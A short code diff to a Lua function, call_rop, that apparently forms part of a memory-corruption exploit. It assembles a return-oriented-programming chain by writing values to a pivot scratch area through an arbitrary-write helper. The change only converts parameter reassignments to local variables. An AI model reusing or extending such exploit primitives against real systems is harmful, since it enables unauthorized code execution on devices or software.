@@ -2,7 +2,7 @@
 function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
     local idx = 0
     
-    rax = rax or 0
+    local rax = rax or 0
     
     local function process_arg(arg)
         if arg == nil then
@@ -14,12 +14,12 @@ function call_rop(address, rax, arg1, arg2, arg3, arg4, arg5, arg6)
         end
     end
     
-    arg1 = process_arg(arg1)
-    arg2 = process_arg(arg2)
-    arg3 = process_arg(arg3)
-    arg4 = process_arg(arg4)
-    arg5 = process_arg(arg5)
-    arg6 = process_arg(arg6)
+    local arg1 = process_arg(arg1)
+    local arg2 = process_arg(arg2)
+    local arg3 = process_arg(arg3)
+    local arg4 = process_arg(arg4)
+    local arg5 = process_arg(arg5)
+    local arg6 = process_arg(arg6)
     
     local function push_chain(value)
         write64_unstable(LUA_PIVOT_SCRATCH + 0x40 + idx * 8, value)
